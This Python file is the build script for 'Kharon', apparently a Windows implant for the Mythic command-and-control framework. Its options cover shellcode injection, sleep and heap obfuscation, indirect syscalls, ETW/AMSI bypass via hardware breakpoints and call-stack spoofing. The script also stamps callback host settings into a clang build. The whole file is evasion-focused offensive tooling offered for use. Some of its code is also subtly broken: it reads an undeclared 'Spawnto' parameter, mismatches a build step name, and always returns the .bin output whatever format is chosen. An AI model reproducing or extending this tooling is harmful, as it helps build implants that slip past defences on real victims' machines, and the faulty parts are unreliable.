import logging, json
import traceback
import pathlib

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from distutils.dir_util import copy_tree
import asyncio, os, tempfile, base64

class KharonAgent( PayloadType ):
    name             = "Kharon";
    file_extension   = "bin";
    author           = "@ Oblivion";
    supported_os     = [SupportedOS.Windows];
    wrapper          = False;
    wrapped_payloads = [];
    note             = \
    """
    Kharon agent. Version: v0.0.1
    """
    supports_dynamic_loading = False;
    c2_profiles      = ["http", "smb"];
    translation_container = "KharonTranslator";
    build_parameters = [
        BuildParameter(
            name            = "Debug",
            parameter_type  = BuildParameterType.Boolean,
            default_value   = "false",
            description     = "0.01 - [GLOBAL] Generate with debug strings. The debug output is handled using DbgPrint and can be viewed in a debugger",
        ),
        BuildParameter(
            name            = "Format",
            parameter_type  = BuildParameterType.ChooseOne,
            choices         = ["exe", "dll", "svc", "bin"],
            default_value   = "bin",
            description     = "0.02 - [GLOBAL] Executable (.exe), Dynamic Linked Library (.dll), Service Executable (.svc.exe) and Shellcode (.bin)",
        ),
        BuildParameter(
            name            = "Architecture",
            parameter_type  = BuildParameterType.ChooseOne,
            choices         = ["x64", "x86"],
            default_value   = "x64",
            description     = "0.03 - [GLOBAL] Architecture to compile",
        ),
        BuildParameter(
            name            = "Injection Shellcode",
            parameter_type  = BuildParameterType.ChooseOne,
            choices         = ["Classic", "Stomp"],
            default_value   = "Classic",
            description     = "1.01 - [AGENT] Technique used to injection shellcode in memory",
        ),
        BuildParameter(
            name            = "Mask",
            parameter_type  = BuildParameterType.ChooseOne,
            choices         = ["Timer", "None"],
            default_value   = "None",
            description     = "1.02 - [AGENT] Technique to beacon obfuscate in memory during sleep",
        ),
        BuildParameter(
            name            = "Heap Mask",
            parameter_type  = BuildParameterType.Boolean,
            default_value   = False,
            description     = "1.03 - [AGENT] Obfuscate the heap during sleep",
        ),
        BuildParameter(
            name            = "Indirect Syscall",
            parameter_type  = BuildParameterType.Boolean,
            default_value   = False,
            description     = "1.04 - [AGENT] Use indirect syscalls",
        ),
        BuildParameter(
            name            = "Hardware Breakpoint",
            parameter_type  = BuildParameterType.ChooseOne,
            choices         = ["ETW", "AMSI", "All", "None"],
            default_value   = "None",
            description     = "1.05 - [AGENT] Use hardware breakpoint to bypass ETW/AMSI",
        ),
        BuildParameter(
            name            = "Call Stack Spoofing",
            parameter_type  = BuildParameterType.Boolean,
            default_value   = "false",
            description     = "1.06 - [AGENT] Spoof the call stack of the specifieds WinAPIs",
        ),
        BuildParameter(
            name            = "BOF Hook",
            parameter_type  = BuildParameterType.Boolean,
            default_value   = False,
            description     = "1.07 - [AGENT] Beacon Object File hooks",
        ),
        BuildParameter(
            name           = "Killdate",
            parameter_type = BuildParameterType.Date,
            description    = "1.08 - [AGENT] Date to kill the agent",
        ),
        BuildParameter(
            name           = "Self Delete",
            parameter_type = BuildParameterType.Boolean,
            default_value  = False,
            description    = "1.09 - [AGENT] Self deletion in kill date routine",
        ),
        BuildParameter(
            name           = "Exit Method",
            parameter_type = BuildParameterType.ChooseOne,
            choices        = ["Process", "Thread"],
            default_value  = "Process",
            description    = "1.10 - [AGENT] Exit method to kill date routine",
        )
    ]

    AgentPath = pathlib.Path(".") / "Kharon";
    AgentIconPath = AgentPath / "Kharon.jpg";
    AgentCodePath = pathlib.Path(".") / ".." / "Agent";
    BrowserScriptPath = AgentPath / "BrowserScripts";

    agent_path      = AgentPath;
    agent_icon_path = AgentIconPath;
    agent_code_path = AgentCodePath;
    agent_browserscript_path = BrowserScriptPath;
    
    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
        BuildStep(step_name="Applying configuration", step_description="Stamping in configuration values"),
        BuildStep(step_name="Compiling", step_description="Compiling with clang")
    ]

    # Build the actual agent payload
    async def build(self) -> BuildResponse:

        logging.basicConfig( level=logging.INFO );

        print( f"path: {self.AgentIconPath}" );

        resp = BuildResponse( status=BuildStatus.Success );
        
        Config = {
            "payload_uuid": self.uuid,
            "callback_host": "",
            "User-Agent": "",
            "callback_jitter": 0,
            "callback_interval": 0,
            "httpMethod": "POST",
            "post_uri": "",
            "headers": [],
            "callback_port": 80,
            "ssl":False,
            "proxyEnabled": False,
            "proxy_host": "",
            "proxy_user": "",
            "proxy_pass": "",
        }

        stdout_err = "";

        for c2 in self.c2info:
            profile = c2.get_c2profile()
            for key, val in c2.get_parameters_dict().items():
                print( key, val )
                if isinstance(val, dict) and 'enc_key' in val:
                    stdout_err += "Setting {} to {}".format(key, val["enc_key"] if val["enc_key"] is not None else "")
                    encKey = base64.b64decode(val["enc_key"]) if val["enc_key"] is not None else ""
                elif key == "headers":
                    Config["User-Agent"]= val["User-Agent"];
                else:
                    Config[key] = val
            break

        if "https://" in Config["callback_host"]:
            Config["ssl"] = True;

        Config["callback_host"] = Config["callback_host"].replace("https://", "").replace("http://","");
        
        if Config["proxy_host"] != "":
            Config["proxyEnabled"] = True;
        
        print( f"Config: {Config}" );

        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID = self.uuid,
                StepName    = "Gathering Files",
                StepStdout  = "Found all files for payload",
                StepSuccess = True
        ));

        AgentPath = tempfile.TemporaryDirectory( suffix=self.uuid )
        copy_tree( str( self.agent_code_path ), AgentPath.name )
        
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID = self.uuid,
                StepName    = "Applying configuration",
                StepStdout  = "All configuration setting applied",
                StepSuccess = True
        ));

        Mask = {
            "None" : 3,
            "Timer": 1,
        }
        
        InjectionPE = {
            "Reflection": 0
        }

        InjectionSc = {
            "Classic": 0,
            "Stomp": 1
        }

        Arch       = self.get_parameter( "Architecture" );
        Format     = self.get_parameter( "Format" );
        Debug      = self.get_parameter( "Debug" );
        InjSc      = self.get_parameter( "Injection Shellcode" );
        MaskID     = self.get_parameter( "Mask" );
        HeapMask   = self.get_parameter( "Heap Mask" );
        Spawntox64 = self.get_parameter( "Spawnto" );
        Syscalls   = self.get_parameter( "Indirect Syscall" );
        HardBreak  = self.get_parameter( "Hardware Breakpoint" );

        MakeArg = f"";

        if HeapMask is True:
            HeapMask = 1;
        else:
            HeapMask = 0;
        
        if Debug is True:
            Debug   = "on";
            MakeArg = f"{Arch}-debug";
        else:
            Debug   = "off";
            MakeArg = f"{Arch}-release";

        Config['post_uri'] = ( "/" + Config['post_uri'] );

        Secure = 0;

        if Config["ssl"] is True:
            Secure = 1;
        
        if HardBreak == "ETW":
            HardBreak = 0x400
        elif HardBreak == "AMSI":
            HardBreak = 0x700
        elif HardBreak == "All":
            HardBreak = 0x100
        elif HardBreak == "None":
            HardBreak = 0x000

        if Syscalls is True:
            Syscalls = 1
        else:
            Syscalls = 0

        Def = {
            "Arch"      : f"ARCH={Arch}",
            "Dbg"       : f"DBGMODE={Debug}",
            "Mask"      : f"KH_SLEEP_MASK={Mask[MaskID]}",
            "Time"      : f"KH_SLEEP_TIME={Config['callback_interval']}",
            "Jitter"    : f"KH_SLEEP_JITTER={Config['callback_jitter']}",
            "InjSc"     : f"KH_INJECTION_SC={InjectionSc[InjSc]}",
            "InjPE"     : f"KH_INJECTION_PE={0}",
            "HeapMask"  : f"KH_HEAP_MASK={HeapMask}",
            "Syscall"   : f"KH_INDIRECT_SYSCALL_ENABLED={Syscalls}",
            "Hwbp"      : f"KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET={HardBreak}",
            "Spawntox64": f"KH_SPAWNTO_X64={Spawntox64}",
            "uuid"      : f"KH_AGENT_UUID={Config['payload_uuid']}",
            "web-port"  : f"WEB_PORT={Config['callback_port']}",
            "web-host"  : f"WEB_HOST={Config['callback_host']}",
            "web-endpt" : f"WEB_ENDPOINT={Config['post_uri']}",
            "web-ua"    : f"WEB_USER_AGENT=\"{Config['User-Agent']}\"",
            "web-secure": f"WEB_SECURE_ENABLED={Secure}"
        };

        AllDefs = " ".join( Def.values() );
        
        CommandBuild   = f"make -C {AgentPath.name} {MakeArg} BUILD_PATH={AgentPath.name} {AllDefs};";

        FileNameExe = ( AgentPath.name + f"/Bin/Kharon.{Arch}.exe" );
        FileNameBin = ( AgentPath.name + f"/Bin/Kharon.{Arch}.bin" );

        print( f"\n\n exe path: {FileNameExe} bin path: {FileNameBin}" )
        print( f"command for build exe: \n{CommandBuild}" )

        proc           = await asyncio.create_subprocess_shell( CommandBuild, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE );
        stdout, stderr = await proc.communicate();

        print( f"\n\nstdout: \n{stdout.decode('cp850')}" );
        print( f"\n\nstrerr: \n{stderr.decode('cp850')}" );
        
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID = self.uuid,
                StepName    = "Compile",
                StepStdout  = "Successfuly compiled Kharon Agent",
                StepSuccess = True
        ));

        build_msg    = "";
        resp.updated_filename = f"Kharon.{Arch}.{Format}"
        resp.payload = open( FileNameBin, "rb" ).read();
        
        resp.build_stderr = stderr;
        resp.build_stdout = stdout;

        return resp;